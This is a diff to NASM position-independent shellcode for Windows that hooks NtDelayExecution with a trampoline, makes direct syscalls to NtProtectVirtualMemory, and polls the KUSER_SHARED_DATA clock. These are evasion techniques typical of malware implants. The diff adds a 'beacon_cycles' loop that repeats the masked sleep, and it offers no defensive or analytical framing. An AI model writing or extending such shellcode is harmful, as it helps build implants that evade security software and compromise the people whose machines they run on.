@@ -12,7 +12,7 @@
 ;   6. Patch NtDelayExecution: `mov rax,<stub>; jmp rax` (12 bytes)
 ;   7. call [NtDelayExecution] -> stub: poll the KUSER_SHARED_DATA clock
 ;      ([0x7FFE0014] = SystemTime), restore bytes, ret
-;   8. NtProtectVirtualMemory(restore); done_flag=1; ret
+;   8. NtProtectVirtualMemory(restore); beacon_cycles--; if >0 goto 5; done_flag=1; ret
 ;
 ; PIC: base (r12) resolved at entry via call/pop; every data ref is
 ;   [r12 + (label - sym_base)]  which nasm folds to a constant displacement.
@@ -122,6 +122,7 @@ sym_base:
     ;     arg0 = RCX mirrored into R10, arg1 = RDX, arg2 = R8, arg3 = R9,
     ;     arg4 = [RSP+0x28]; RSP must be ≡ 8 (mod 16) at the `syscall`,
     ;     matching ntdll's own leaf thunks.
+.beacon_top:
     mov r10, [r12 + (saved_ntdelay - sym_base)]
     mov [r12 + (prot_base - sym_base)], r10
     mov dword [r12 + (prot_size - sym_base)], 12
@@ -206,6 +207,11 @@ sym_base:
     syscall
     mov rsp, r13                     ; restore RSP = S0
 
+    ; ---- loop tail: one masked 250 ms sleep per cycle -----------------------
+    mov rax, [r12 + (beacon_cycles - sym_base)]
+    dec rax
+    mov [r12 + (beacon_cycles - sym_base)], rax
+    jnz .beacon_top
     mov qword [r12 + (done_flag - sym_base)], 1
 
 .exit:
@@ -403,6 +409,7 @@ find_export:
 ; ---------------------------------------------------------------------------
 ; data (qword-aligned slots; strings at the end)
 ; ---------------------------------------------------------------------------
+beacon_cycles: dq 3
 saved_bytes:    resq 2                 ; 12 bytes (+4 pad) of NtDelayExecution
 saved_ntdelay:  resq 1
 saved_ntprotect:resq 1
